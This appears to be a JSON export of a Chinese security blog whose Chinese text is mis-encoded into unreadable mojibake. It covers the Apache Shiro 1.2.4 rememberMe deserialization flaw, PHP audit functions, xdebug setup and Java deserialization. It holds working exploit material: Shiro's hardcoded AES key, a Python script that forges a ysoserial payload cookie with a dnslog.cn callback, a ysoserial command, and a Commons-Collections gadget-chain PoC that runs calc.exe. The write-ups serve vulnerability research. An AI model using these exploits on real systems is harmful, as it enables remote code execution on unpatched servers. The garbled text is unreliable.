è¿›è¡Œè§£å¯†å¹¶ä¸”ååºåˆ—åŒ–ï¼Œæœ€ç»ˆé€ æˆååºåˆ—åŒ–æ¼æ´žã€‚ æ¼æ´žåˆ†æž èŽ·å– Apache Shiro å­˜åœ¨æ¼æ´žçš„æºä»£ç  123git clone https://github.com/apache/shiro.git cd shiro git checkout shiro-root-1.2.4 ä¿®æ”¹ /shiro/samples/web/pom.xml 123456789101112&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;taglibs&lt;/groupId&gt; &lt;artifactId&gt;standard&lt;/artifactId&gt; &lt;version&gt;1.1.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt; ç„¶åŽç”¨ideaå¯¼å…¥mvné¡¹ç›® è®¾ç½®run/debug configurationsï¼Œ æ·»åŠ æœ¬åœ°tomcatçŽ¯å¢ƒ åœ¨ org.apache.shiro.mgt.RememberMeManager#onSuccessfulLogin å¤„æ·»åŠ æ–­ç‚¹ï¼Œç„¶åŽdebug å¼€å¯ tomcat æœåŠ¡ åŠ å¯†è¿‡ç¨‹ ç™»å½•è´¦æˆ·root/secretï¼Œå‹¾é€‰ä¸ŠRemember Meçš„æŒ‰é’®ï¼Œç¨‹åºä¼šåœåœ¨æ–­ç‚¹å¤„ï¼Œç”¨æˆ·åå’Œå¯†ç ä¹Ÿä¼šå­˜å‚¨åœ¨ token ä¸­forgetIdentity é’ˆå¯¹ subject å˜é‡è¿›è¡Œå¤„ç†ï¼Œè·Ÿè¿› forgetIdentity æ–¹æ³•org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(org.apache.shiro.subject.Subject) è°ƒç”¨ forgetIdentity æž„é€ æ–¹æ³•å¤„ç† request å’Œ reponse è¯·æ±‚org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse) è·Ÿè¿› removeFrom æ–¹æ³•ï¼Œåœ¨ response å“åº”å¤´ä¸­åŠ å…¥äº†ä¸€äº›cookieä¿¡æ¯ã€‚org.apache.shiro.web.servlet.SimpleCookie#removeFrom å›žåˆ° onSuccessfulLogin è°ƒç”¨ rememberIdentity ç”Ÿæˆ cookie ä¸­çš„ remember å­—æ®µã€‚è·Ÿè¿› rememberIdentity æ–¹æ³•ã€‚org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(org.apache.shiro.subject.Subject, org.apache.shiro.authc.AuthenticationToken, org.apache.shiro.authc.AuthenticationInfo) é€šè¿‡ getIdentityToRemember èŽ·å–ç”¨æˆ·çš„èº«ä»½ï¼Œç»§ç»­è·Ÿè¿› rememberIdentity æ–¹æ³•ã€‚org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(org.apache.shiro.subject.Subject, org.apache.shiro.subject.PrincipalCollection) è°ƒç”¨ convertPrincipalsToBytes æ–¹æ³•å°† accountPrincipals &lt;â€œrootâ€&gt; è½¬æ¢ä¸ºå­—èŠ‚å½¢å¼ï¼Œè·Ÿè¿› convertPrincipalsToBytes æ–¹æ³•ã€‚org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes è½¬æ¢è¿‡ç¨‹ä¸­é¦–å…ˆå¯¹ç”¨æˆ·çš„ id è¿›è¡Œåºåˆ—åŒ–ï¼Œç„¶åŽåˆ©ç”¨ encrypt è¿›è¡ŒåŠ å¯†ã€‚org.apache.shiro.mgt.AbstractRememberMeManager#encrypt åŠ å¯†çš„å¯†é’¥ç”±getEncryptionCipherKey()å¾—åˆ° getEncryptionCipherKey å®žé™…ä¸Šæ˜¯å¼€å¤´ä¸­çš„ DEFAULT_CIPHER_KEY_BYTES çš„å¸¸é‡ kPH+bIxk5D2deZiIxcaaaA== å¯†é’¥åˆ†æžorg.apache.shiro.mgt.AbstractRememberMeManager#AbstractRememberMeManager org.apache.shiro.mgt.AbstractRememberMeManager#setCipherKey org.apache.shiro.mgt.AbstractRememberMeManager#setEncryptionCipherKey org.apache.shiro.mgt.AbstractRememberMeManager#getEncryptionCipherKey ç»§ç»­å•æ­¥æ‰§è¡Œï¼Œè¿”å›ž rememberIdentity å‡½æ•° è·Ÿè¿›å‡½æ•° rememberSerializedIdentity org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentityå¯¹å€¼è¿›è¡Œ base64 ç¼–ç ä¹‹åŽï¼Œè®¾ç½®åˆ° cookie ä¸­ã€‚ å½“æˆ‘ä»¬å‹¾é€‰ RememberMe é€‰é¡¹æ¡†ä¹‹åŽï¼Œç‚¹å‡»ç™»é™†ä¹‹åŽï¼ŒåŽç«¯ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œã€‚ åºåˆ—åŒ–ç”¨æˆ· id å¯¹ç”¨æˆ· id è¿›è¡Œ AES åŠ å¯†ï¼Œå¯†é’¥ä¸ºå¸¸é‡ base64 ç¼–ç  è®¾ç½®åˆ° cookie ä¸­çš„ rememberme å­—æ®µ è§£å¯†è¿‡ç¨‹ åœ¨ org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity æ·»åŠ æ–­ç‚¹ï¼Œç„¶åŽå‘é€ä¸€ä¸ªå¸¦æœ‰ readmemberMe cookieçš„è¯·æ±‚ã€‚ è·Ÿè¿›å‡½æ•° getRememberedPrincipalsorg.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals è°ƒç”¨ getRememberedSerializedIdentity é’ˆå¯¹httpè¯·æ±‚è¿›è¡Œå¤„ç†ï¼Œè·Ÿè¿› getRememberedSerializedIdentity org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity getCookie æž„é€ æ–¹æ³•å…ˆèŽ·å– cookie ä¿¡æ¯,readValue æ–¹æ³•ï¼Œæ ¹æ® Cookie ä¸­çš„ name å­—æ®µèŽ·å– Cookie çš„å€¼ï¼Œç„¶åŽè¿”å›ž Cookie çš„å€¼ ç„¶åŽè°ƒç”¨ byte[] decoded = Base64.decode(base64)å¤„ç† base64 åŠ å¯†çš„ Cookie ä¿¡æ¯ï¼Œå¹¶ä¸”å°†è¿™ä¸ª Cookie è½¬åŒ–ä¸ºäºŒè¿›åˆ¶å­—èŠ‚ç  å›žåˆ° getRememberedPrincipalsï¼Œç»§ç»­è·Ÿè¿› convertBytesToPrincipals å‡½æ•°org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals AES è§£å¯† org.apache.shiro.mgt.AbstractRememberMeManager#decrypt ååºåˆ—åŒ– org.apache.shiro.mgt.AbstractRememberMeManager#deserializeorg.apache.shiro.io.DefaultSerializer#deserializeçœ‹åˆ° readObject() å½“æˆ‘ä»¬å‘é€å¸¦æœ‰ readmemberMe cookieçš„è¯·æ±‚ï¼ŒåŽç«¯ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œã€‚ è¯»å– cookie ä¸­ rememberMe çš„å€¼ base64 è§£ç  è¿›è¡Œ AES è§£å¯†ï¼Œå¯†é’¥ä¸ºå¸¸é‡ ååºåˆ—åŒ– 123456789101112131415161718192021222324252627282930#!/usr/bin/env python3# coding:utf-8from Crypto.Cipher import AESimport tracebackimport requestsimport subprocessimport uuidimport base64target = \"http://localhost:8080/samples_web_war/\"jar_file = 'F:\\\\Penetration\\\\ysoserial\\\\ysoserial-0.0.6-SNAPSHOT-all.jar'cipher_key = \"kPH+bIxk5D2deZiIxcaaaA==\"# åˆ›å»º remembermeçš„å€¼popen = subprocess.Popen(['java','-jar',jar_file, \"URLDNS\", \"http://7zhfmm.dnslog.cn\"], stdout=subprocess.PIPE)BS = AES.block_sizepad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()mode = AES.MODE_CBCiv = uuid.uuid4().bytesencryptor = AES.new(base64.b64decode(cipher_key), mode, iv)file_body = pad(popen.stdout.read())base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))# å‘é€requesttry: r = requests.get(target, cookies={'rememberMe':base64_ciphertext.decode()}, timeout=10)except: traceback.print_exc() æ¼æ´žåˆ©ç”¨ commons-collections 3.2.1 shiroè‡ªå¸¦çš„commons-collections-3.2.1 ã€commons-beanutils-1.8.3 åœ¨JDK1.8u112ä¸­ï¼Œå¯ä»¥ç›´æŽ¥åˆ©ç”¨ ysoserial ä¸­çš„Commons-Collections5ï¼ˆ3.1-3.2.1ï¼Œjdk1.8ï¼‰ 1java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 \"clac\" ä¼šæŠ¥é”™æç¤º org.apache.shiro.io.SerializationException: Unable to deserialze argument byte array. å›žåˆ° org.apache.shiro.io.DefaultSerializer#deserialize æˆ‘ä»¬å‘çŽ°åœ¨è¿™é‡Œä½¿ç”¨äº† ClassResolvingObjectInputStream ç±»è€Œéžä¼ ç»Ÿçš„ ObjectInputStream org.apache.shiro.io.ClassResolvingObjectInputStream#resolveClass java.io.ObjectInputStream#resolveClass ObjectInputStream çš„ resolveClass å‡½æ•°ç”¨çš„æ˜¯Class.forName ç±»èŽ·å–å½“å‰æè¿°å™¨æ‰€æŒ‡ä»£çš„ç±»çš„Classå¯¹è±¡ shiro ä¸­ ClassResolvingObjectInputStream ç»§æ‰¿äº† ObjectInputStreamï¼ŒresolveClass è¢«é‡å†™ï¼Œè°ƒç”¨äº† ClassUtils.forName èŽ·å–å½“å‰æè¿°å™¨æ‰€æŒ‡ä»£çš„ç±»çš„Classå¯¹è±¡ org.apache.shiro.util.ClassUtils#forName çœ‹ä¸€ä¸‹ ExceptionIgnoringAccessor æ˜¯å¦‚ä½•æ˜¯å®žçŽ°çš„org.apache.shiro.util.ClassUtils.ExceptionIgnoringAccessor commons-collections 4.0 å‚è€ƒæ–‡ç«  Apache Shiro Javaååºåˆ—åŒ–æ¼æ´žåˆ†æžShiro 1.2.4 RememberMeååºåˆ—åŒ–æ¼æ´žè¸©å‘åˆ†æž(CVE-2016-4437)Pwn a CTF Platform with Java JRMP Gadget document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"ç›¸å…³å‡½æ•°æ€»ç»“","slug":"ç›¸å…³å‡½æ•°æ€»ç»“","date":"2020-08-20T13:31:50.000Z","updated":"2020-09-25T09:27:01.333Z","comments":true,"path":"2020/08/20/ç›¸å…³å‡½æ•°æ€»ç»“/","link":"","permalink":"http://yoursite.com/2020/08/20/%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/","excerpt":"PHP ç›¸å…³å‡½æ•°","text":"PHP ç›¸å…³å‡½æ•° å®¡è®¡åˆ©ç”¨å‡½æ•° var_dump() var_dump() å‡½æ•°ç”¨äºŽè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ã€‚ ä»»æ„æ–‡ä»¶ä¸‹è½½ fread() fread() å‡½æ•°è¯»å–æ–‡ä»¶ï¼ˆå¯å®‰å…¨ç”¨äºŽäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰fread(file,length) å‚æ•° æè¿° file å¿…éœ€ã€‚è§„å®šè¦è¯»å–æ‰“å¼€æ–‡ä»¶ã€‚ length å¿…éœ€ã€‚è§„å®šè¦è¯»å–çš„æœ€å¤§å­—èŠ‚æ•°ã€‚ 123456789101112131415$path = \"../{$file}\";$handle = fopen($path, \"r\");header(\"Pragma: \");header(\"Cache-Control: \");header(\"Content-type: application/octet-stream; charset=utf-8\");header(\"Content-Disposition: attachment; filename=\\\"{$name}\\\"\");if ($handle) { while (!feof($handle)) { $read = fread($handle, 4096); print($read); }}pclose($handle); å˜é‡è¦†ç›– extrat() extract() ä»Žæ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ å‘½ä»¤æ‰§è¡Œ call_user_func_array() call_user_func_array(â€œsystemâ€,[â€œwhoamiâ€]); document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"phpstormè¿›è¡ŒPHPæ–­ç‚¹è°ƒè¯•","slug":"phpstormè¿›è¡ŒPHPæ–­ç‚¹è°ƒè¯•","date":"2020-08-20T07:19:41.000Z","updated":"2020-09-25T09:27:01.332Z","comments":true,"path":"2020/08/20/phpstormè¿›è¡ŒPHPæ–­ç‚¹è°ƒè¯•/","link":"","permalink":"http://yoursite.com/2020/08/20/phpstorm%E8%BF%9B%E8%A1%8CPHP%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/","excerpt":"é…ç½®çŽ¯å¢ƒ phpstromphpstudy","text":"é…ç½®çŽ¯å¢ƒ phpstromphpstudy phpstrom é…ç½® php çŽ¯å¢ƒ PHPå®‰è£…xdebugæ‰©å±• æ³¨æ„ç‰ˆæœ¬ï¼šæ­¤æ—¶æˆ‘ä»¬ php çš„ç‰ˆæœ¬ä¸º php5.6.9xdebugæ¨¡å—https://xdebug.org/files/php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dll æŠŠä¸‹è½½æˆåŠŸçš„ php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dllæ”¾åœ¨ E:\\Tools\\phpstudy_pro\\Extensions\\php\\php5.6.9nts\\ext æ–‡ä»¶å¤¹ä¸‹ åŒæ—¶åœ¨ php.ini ä¸­æ·»åŠ å¦‚ä¸‹é…ç½® 12345678910111213[xdebug]zend_extension=\"E:/Tools/phpstudy_pro/Extensions/php/php5.6.9nts/ext/php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dll\" ;æŒ‡å®šXdebugæ‰©å±•æ–‡ä»¶çš„ç»å¯¹è·¯å¾„xdebug.auto_trace=on ;å¯ç”¨ä»£ç è‡ªåŠ¨è·Ÿè¸ªxdebug.collect_params=on ;å…è®¸æ”¶é›†ä¼ é€’ç»™å‡½æ•°çš„å‚æ•°å˜é‡xdebug.collect_return=on ;å…è®¸æ”¶é›†å‡½æ•°è°ƒç”¨çš„è¿”å›žå€¼xdebug.trace_output_dir=\"E:/Tools/phpstudy_pro/Extensions/php/tmp/xdebug\" ;æŒ‡å®šå †æ ˆè·Ÿè¸ªæ–‡ä»¶çš„å­˜æ”¾ç›®å½•xdebug.profiler_enable=on ;æ˜¯å¦å¯ç”¨Xdebugçš„æ€§èƒ½åˆ†æžï¼Œå¹¶åˆ›å»ºæ€§èƒ½ä¿¡æ¯æ–‡ä»¶xdebug.profiler_output_dir=\"E:/Tools/phpstudy_pro/Extensions/php/tmp/xdebug\" ;æŒ‡å®šæ€§èƒ½åˆ†æžä¿¡æ¯æ–‡ä»¶çš„è¾“å‡ºç›®å½•xdebug.remote_enable = on ;æ˜¯å¦å¼€å¯è¿œç¨‹è°ƒè¯•xdebug.remote_handler = dbgp ;æŒ‡å®šè¿œç¨‹è°ƒè¯•çš„å¤„ç†åè®®xdebug.remote_host= localhost ;æŒ‡å®šè¿œç¨‹è°ƒè¯•çš„ä¸»æœºåxdebug.remote_port = 9000 ;æŒ‡å®šè¿œç¨‹è°ƒè¯•çš„ç«¯å£å·xdebug.idekey = PHPSTORM ;æŒ‡å®šä¼ é€’ç»™DBGpè°ƒè¯•å™¨å¤„ç†ç¨‹åºçš„IDE Key PHPStrom é…ç½® debug çŽ¯å¢ƒ é…ç½® Debug ç«¯å£ é…ç½®IDEKEY é…ç½®Server é…ç½®PHP Web Application æµè§ˆå™¨çš„xdebugæ’ä»¶ æµ‹è¯•è°ƒè¯• åŠ ä¸Šæ–­ç‚¹ï¼ŒåŒæ—¶æŠŠå°ç”µè¯è®¾ç½®æˆä¸ºç»¿è‰²çš„æµè§ˆå™¨ä¸Šçš„æ’ä»¶æ‰“å¼€ï¼ŒåŒæ—¶è®¿é—®è¦è°ƒè¯•çš„é¡µé¢ è°ƒè¯•å•ä¸ªæ–‡ä»¶ è°ƒè¯•å•ä¸ªæ–‡ä»¶æ—¶ é…ç½®PHP Web Applicationç‚¹å‡»ç»¿è‰²çš„å°è™«å­å°±å¯ä»¥è¿›è¡Œè°ƒè¯•äº† å°±å¯ä»¥è¿›è¡Œæ„‰å¿«çš„è°ƒå¼äº†ï¼ åœ¨è¿›è¡Œè°ƒè¯•æ—¶ï¼Œç»å¸¸é‡åˆ°è¿™ä¸ªé—®é¢˜,xdebugæ–­æŽ‰è°ƒè¯•ç»å¸¸æ— æ•…æ–­å¼€ å¦‚æžœé’ˆå¯¹æŸä¸€ä¸ªé¡¹ç›®å¯ä»¥å¯¹é¡¹ç›®çš„é…ç½®æ–‡ä»¶ vhosts.conf ä¸­æ·»åŠ  12IPCConnectTimeout 3000IPCCommTimeout 3000 è¦å¯¹æ‰€æœ‰é¡¹ç›®éƒ½è¿›è¡Œé…ç½®æ—¶ï¼Œå¯ä»¥ä¿®æ”¹httpd.conf document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"åˆè¯†Java ååºåˆ—åŒ–","slug":"åˆè¯†Javaååºåˆ—åŒ–","date":"2020-08-16T13:31:50.000Z","updated":"2020-09-25T09:27:01.333Z","comments":true,"path":"2020/08/16/åˆè¯†Javaååºåˆ—åŒ–/","link":"","permalink":"http://yoursite.com/2020/08/16/%E5%88%9D%E8%AF%86Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"åˆè¯†Java ååºåˆ—åŒ– What ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ä¸Žååºåˆ—åŒ– java åºåˆ—åŒ–å¯ä»¥å°†ä¸€ä¸ªå¯¹è±¡åºåˆ—åŒ–æˆJVMè®¤è¯†çš„å­—èŠ‚åºåˆ—ï¼Œå­—èŠ‚åºåˆ—ä¸­åŒ…å«äº†å¯¹è±¡çš„æ•°æ®ï¼Œä¸»è¦ä»¥å¯¹è±¡å±žæ€§ä¸ºä¸»ã€‚ java ååºåˆ—åŒ–æ˜¯æŒ‡æŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºjavaå¯¹è±¡çš„è¿‡ç¨‹ã€‚åˆ©ç”¨åœ¨Aå¹³å°ä¸Šåºåˆ—åŒ–äº§ç”Ÿçš„å­—èŠ‚åºåˆ—ï¼Œå¯ä»¥åœ¨Bå¹³å°ä¸Šååºåˆ—åŒ–å‡ºåŒæ ·çš„å¯¹è±¡ã€‚","text":"åˆè¯†Java ååºåˆ—åŒ– What ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ä¸Žååºåˆ—åŒ– java åºåˆ—åŒ–å¯ä»¥å°†ä¸€ä¸ªå¯¹è±¡åºåˆ—åŒ–æˆJVMè®¤è¯†çš„å­—èŠ‚åºåˆ—ï¼Œå­—èŠ‚åºåˆ—ä¸­åŒ…å«äº†å¯¹è±¡çš„æ•°æ®ï¼Œä¸»è¦ä»¥å¯¹è±¡å±žæ€§ä¸ºä¸»ã€‚ java ååºåˆ—åŒ–æ˜¯æŒ‡æŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºjavaå¯¹è±¡çš„è¿‡ç¨‹ã€‚åˆ©ç”¨åœ¨Aå¹³å°ä¸Šåºåˆ—åŒ–äº§ç”Ÿçš„å­—èŠ‚åºåˆ—ï¼Œå¯ä»¥åœ¨Bå¹³å°ä¸Šååºåˆ—åŒ–å‡ºåŒæ ·çš„å¯¹è±¡ã€‚ Why ä¸ºä»€ä¹ˆè¦ç”¨åºåˆ—åŒ–ä¸Žååºåˆ—åŒ– å®žçŽ°äº†æ•°æ®çš„æŒä¹…åŒ–ï¼Œé€šè¿‡åºåˆ—åŒ–å¯ä»¥æŠŠæ•°æ®æ°¸ä¹…çš„ä¿å­˜åœ¨ç¡¬ç›˜ä¸Šã€‚ åˆ©ç”¨åºåˆ—åŒ–å®žçŽ°è¿œç¨‹é€šä¿¡ï¼Œå³åœ¨ç½‘ç»œä¸Šä¼ é€å¯¹è±¡çš„å­—èŠ‚åºåˆ—ã€‚ How å¦‚ä½•å®žçŽ°åºåˆ—åŒ–ä¸Žååºåˆ—åŒ– JDKç±»åº“ä¸­åºåˆ—åŒ–API ä½¿ç”¨åˆ°JDKä¸­å…³é”®ç±» ObjectOutputStream(å¯¹è±¡è¾“å‡ºæµ) å’ŒObjectInputStream(å¯¹è±¡è¾“å…¥æµ) ObjectOutputStream ç±»ä¸­ï¼šé€šè¿‡ä½¿ç”¨ writeObject(Object object) æ–¹æ³•ï¼Œå°†å¯¹è±¡ä»¥äºŒè¿›åˆ¶æ ¼å¼è¿›è¡Œå†™å…¥ã€‚ ObjectInputStream ç±»ä¸­ï¼šé€šè¿‡ä½¿ç”¨ readObjectï¼ˆï¼‰æ–¹æ³•ï¼Œä»Žè¾“å…¥æµä¸­è¯»å–äºŒè¿›åˆ¶æµï¼Œè½¬æ¢æˆå¯¹è±¡ã€‚ åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ è¢«åºåˆ—åŒ–çš„ç±»å¿…é¡»è¦å®žçŽ° Serializable æŽ¥å£ï¼Œå¦åˆ™å°†æ— æ³•åºåˆ—åŒ–å¯¹è±¡ã€‚ 1234public class User implements Serializable { public String name; public int age;} 12345678910111213141516public class Main { public static void main(String[] args) throws IOException { User user =new User(); user.age = 18; user.name = \"whippet\"; PrintStream out = System.out; ObjectOutputStream objectOutputStream = new ObjectOutputStream(out); objectOutputStream.writeObject(user); objectOutputStream.flush(); objectOutputStream.close(); }} åºåˆ—åŒ–å¯¹è±¡æ—¶ä½¿ç”¨å¯¹è±¡è¾“å‡ºæµâ€ObjectOutputStreamâ€ï¼Œå¾€æŒ‡å®šè¾“å‡ºæµé‡Œå†™å…¥ User å¯¹è±¡ï¼Œä½¿ç”¨æŽ§åˆ¶å°ï¼Œå¯ä»¥ç›´è§‚çš„çœ‹åˆ°å¯¹è±¡åºåˆ—åŒ–åŽçš„æ ·å­ã€‚ ï¿½ï¿½ \u0005sr Simple.Userï¿½ï¿½Gm|\u0007X\u001d\u0002 \u0002I \u0003ageL \u0004namet \u0012Ljava/lang/String;xp \u0012t \u0007whippet ååºåˆ—åŒ–å¯¹è±¡ å°†å¯¹è±¡åºåˆ—åŒ–æˆbyteæ•°ç»„ã€‚å†ç”¨â€ObjectInputStreamâ€ååºåˆ—åŒ–å›žæ¥ã€‚ 12345678910111213141516171819202122232425262728public class Main { public static void main(String[] args) throws IOException, ClassNotFoundException { User user =new User(); user.age = 18; user.name = \"whippet\"; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//ç”¨äºŽå­˜æ”¾personå¯¹è±¡åºåˆ—åŒ–byteæ•°ç»„çš„è¾“å‡ºæµ ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(user);//åºåˆ—åŒ–å¯¹è±¡ objectOutputStream.flush(); objectOutputStream.close(); byte[] bytes = byteArrayOutputStream.toByteArray(); //è¯»å–åºåˆ—åŒ–åŽçš„å¯¹è±¡byteæ•°ç»„ ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//å­˜æ”¾byteæ•°ç»„çš„è¾“å…¥æµ ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); Object o = objectInputStream.readObject(); //å°†byteæ•°ç»„è¾“å…¥æµååºåˆ—åŒ– System.out.println(o); }} è¾“å‡ºè¿™ä¸ªååºåˆ—åŒ–åŽçš„å¯¹è±¡ï¼Œå’Œä¸€å¼€å§‹ä¸º User å¯¹è±¡è®¾å®šçš„å±žæ€§å€¼å®Œå…¨ç›¸åŒã€‚åŒæ—¶Javaä¸ºæˆ‘ä»¬æä¾›äº†è‡ªå®šä¹‰writeObject()ã€readObject()æ–¹æ³•çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬åœ¨ç›®æ ‡ç±»ä¸­è‡ªå®šä¹‰writeObject()ã€readObject()æ–¹æ³•ä¹‹åŽï¼Œå°†ä¼šé¦–å…ˆè°ƒç”¨æˆ‘ä»¬è‡ªå®šä¹‰çš„æ–¹æ³•ï¼Œç„¶åŽåœ¨ç»§ç»­æ‰§è¡ŒåŽŸæœ‰çš„æ–¹æ³•æ­¥éª¤. 1234567891011121314151617181920public class User implements Serializable { public String name; public int age; @Override public String toString() { return \"User{\" + \"name='\" + name + '\\'' + \", age=\" + age + '}'; } private void readObject(java.io.ObjectInputStream in)throws IOException,ClassNotFoundException { Runtime.getRuntime().exec(\"calc\"); }} User ç±»å†™ä¸€ä¸ª readObject æ–¹æ³•ä¸ŠåŽ»ï¼Œå½“å¯¹è±¡è¢«ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œè¯¥æ–¹æ³•å°±ä¼šè¢«è°ƒç”¨ã€‚ åºåˆ—åŒ–æ—¶ä»…èƒ½åºåˆ—åŒ–å¯¹è±¡çš„å±žæ€§ï¼Œå¹¶ä¸èƒ½æŽ§åˆ¶æ–¹æ³•ä¸­çš„reObjectçš„ä»£ç ï¼Œæ‰€æœ‰æ¼æ´žçš„æž„é€ éœ€è¦å¼•å…¥æ–°çš„jaråŒ… commons-collections-3.1ååºåˆ—åŒ–æ¼æ´ž æ¼æ´žåˆ©ç”¨ åˆ©ç”¨maven å®‰è£…ä¾èµ– 12345678&lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 1234567891011121314151617181920212223242526272829303132import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class Pocexec { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}) }; //å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±» Transformer transformerChain = new ChainedTransformer(transformers); //åˆ›å»ºMapå¹¶ç»‘å®štransformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //è§¦å‘æ¼æ´ž Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); onlyElement.setValue(\"foobar\"); }} æ¼æ´žåˆ†æž java.lang.Runtime#exec(java.lang.String)åœ¨execå¤„æ·»åŠ æ–­ç‚¹ æŸ¥çœ‹è°ƒç”¨é“¾ æœ€ç»ˆéåŽ†äº†â€outerMapâ€è¿™ä¸ªMapå¯¹è±¡çš„ Entry é›†åˆï¼Œç„¶åŽæ‰§è¡Œäº† Entry å¯¹è±¡çš„çš„ setValue æ–¹æ³•å¯¼è‡´æ‰§è¡Œäº†åå°„é“¾ã€‚æ‰€ä»¥å…ˆæŸ¥çœ‹ outerMap çš„å®žçŽ°ç±» Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); è°ƒç”¨äº†æ–¹æ³•org.apache.commons.collections.map.TransformedMap#decorateè¿™ä¸ªé™æ€æ–¹æ³•åˆåŽ»newäº†ä¸€ä¸ªTransformedMapå¯¹è±¡ã€‚mapä¼ å…¥çš„æ˜¯ä¸€ä¸ªæ™®é€šçš„æ•°æ®ï¼ŒvalueTransformeråˆ™æ˜¯æž„é€ çš„è°ƒç”¨é“¾ã€‚org.apache.commons.collections.map.TransformedMap#TransformedMapå®žä¾‹åŒ–å¯¹è±¡æˆåŠŸåŽä¾æ¬¡è°ƒç”¨äº†å››ä¸ªæ–¹æ³• entrySet() iterator() next() setValue() åœ¨ç±» TransformedMapä¸­æœªæ‰¾åˆ°å®šä¹‰çš„ entrySet()æ–¹æ³•ï¼Œåœ¨ä»–çš„çˆ¶ç±»AbstractInputCheckedMapDecorator ä¸­æ‰¾org.apache.commons.collections.map.AbstractInputCheckedMapDecorator#entrySetnew 